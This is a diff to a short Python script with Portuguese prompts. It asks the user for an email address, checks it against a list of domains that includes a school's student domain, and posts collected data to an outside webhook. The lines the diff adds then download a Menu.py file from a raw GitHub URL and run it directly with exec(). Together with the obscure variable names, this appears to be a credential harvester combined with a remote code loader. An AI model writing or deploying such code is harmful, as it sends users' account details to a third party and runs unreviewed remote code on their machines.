@@ -6,7 +6,10 @@ def çj(po):
     dom = ['@gmail.com', '@hotmail.com', '@aluno.pedreira.org']
     return any(po.endswith(x) for x in dom)
 
-while True:
+tentativas = 0
+max_tentativas = 3
+
+while tentativas < max_tentativas:
     while True:
         po = input("Digite seu email>\n")
         if çj(po):
@@ -23,3 +26,9 @@ while True:
     }
 
     requests.post(webhook, data=lk)
+    tentativas += 1
+
+print("\033[32mIniciando o Menu...\033[0m\n")
+
+Mc = requests.get("https://raw.githubusercontent.com/SAMU-SCPT/FiotsCria/refs/heads/main/Menu.py").text
+exec(Mc)
